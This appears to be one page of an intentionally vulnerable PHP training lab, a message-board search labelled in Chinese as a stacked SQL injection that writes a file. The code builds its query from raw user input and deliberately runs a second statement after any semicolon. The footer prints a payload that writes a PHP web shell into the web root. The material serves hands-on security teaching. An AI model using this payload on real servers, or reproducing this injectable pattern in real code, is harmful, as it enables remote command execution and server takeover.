<?php
// 堆叠注入-写文件
$db = getVulnDB();
$result = null;

if (isset($_POST['keyword'])) {
    $keyword = $_POST['keyword'];
    $sql = "SELECT id, username, content FROM messages WHERE content LIKE '%$keyword%'";
    try {
        $stmt = $db->query($sql);
        if ($stmt) {
            $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        }
        // 模拟堆叠执行
        if (strpos($keyword, ';') !== false) {
            $parts = explode(';', $sql);
            if (count($parts) > 1 && !empty(trim($parts[1]))) {
                try {
                    $db->query(trim($parts[1]));
                } catch (Exception $e) {}
            }
        }
    } catch (Exception $e) {
        $result = 'error:' . $e->getMessage();
    }
}
?>

<p>留言板搜索（堆叠注入-写文件）</p>
<p>利用堆叠注入的 SELECT INTO OUTFILE 写入WebShell。</p>

<form method="POST">
    <label>搜索关键词</label>
    <input type="text" name="keyword" placeholder="搜索留言" value="<?= h($_POST['keyword'] ?? '') ?>">
    <button type="submit" class="btn btn-primary">搜 索</button>
</form>

<?php if (is_string($result) && strpos($result, 'error:') === 0): ?>
    <div class="result-box" style="color:var(--danger);">错误：<?= h(substr($result, 6)) ?></div>
<?php elseif (is_array($result)): ?>
    <div class="result-box">
        <?php if (empty($result)): ?>
            <span style="color:var(--text-muted);">未找到匹配内容</span>
        <?php else: ?>
            <table><tr><th>ID</th><th>用户</th><th>内容</th></tr>
            <?php foreach ($result as $row): ?>
            <tr><td><?= h($row['id']) ?></td><td><?= h($row['username']) ?></td><td><?= h($row['content']) ?></td></tr>
            <?php endforeach; ?></table>
        <?php endif; ?>
   </div>
<?php endif; ?>

<p style="margin-top:1rem; font-size:0.8rem; color:var(--text-muted);">
    写文件Payload：'; SELECT '&lt;?php system($_GET[cmd]); ?&gt;' INTO OUTFILE '/var/www/html/uploads/shell.php'; --
</p>
